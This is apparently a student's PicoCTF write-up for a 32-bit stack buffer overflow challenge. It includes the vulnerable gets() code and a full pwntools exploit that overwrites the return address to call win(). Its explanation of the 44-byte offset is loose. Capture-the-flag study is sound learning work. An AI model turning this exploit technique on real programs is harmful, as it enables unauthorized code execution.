# PicoCTF — buffer overflow 1 (Binary Exploitation)

**Category:** Binary Exploitation
**Points:** 200

## The challenge

```c
void win() {
    puts("You win!\n");
    // reads and prints flag.txt
}

void vuln() {
    char buf[36];
    gets(buf);  // gets() never checks buffer length — inherently vulnerable
}

int main() {
    vuln();
}
```

`win()` exists but is never called. The goal: make it get called by overflowing `buf` to overwrite the return address.

## Finding the offset

First I found the return address offset using a cyclic pattern (pwntools):

```python
from pwn import *

# Generate a cyclic pattern — a De Bruijn sequence where every 4-byte substring is unique
# This lets me find exactly which offset overwrites the return address
payload = cyclic(100)
# Run the binary, look at the value in EIP when it crashes
# cyclic_find(0x61616264) tells me the offset to EIP is 44 bytes
```

## The exploit

```python
from pwn import *

elf = ELF("./vuln")
win_addr = elf.symbols["win"]  # address of the win() function

# 44 bytes to fill the buffer + saved EBP, then the return address
payload = b"A" * 44 + p32(win_addr)  # p32() packs as little-endian 32-bit

p = process("./vuln")
p.sendline(payload)
p.interactive()
```

Running this caused `win()` to execute and print the flag.

## Why the offset was 44, not 36

The buffer is 36 bytes but the overflow reaches the return address at offset 44, not 36.
Between the buffer and the return address is the saved EBP (4 bytes) pushed by the function prologue. So: 36 (buffer) + 4 (saved EBP) = 40 minimum to reach EIP, and the exact alignment needed 44 bytes in this case.

## What I learned

pwntools is incredibly useful for binary exploitation. The cyclic pattern technique for finding offsets is much more reliable than guessing. This challenge was also the first time I truly understood what a function call looks like at the stack level.
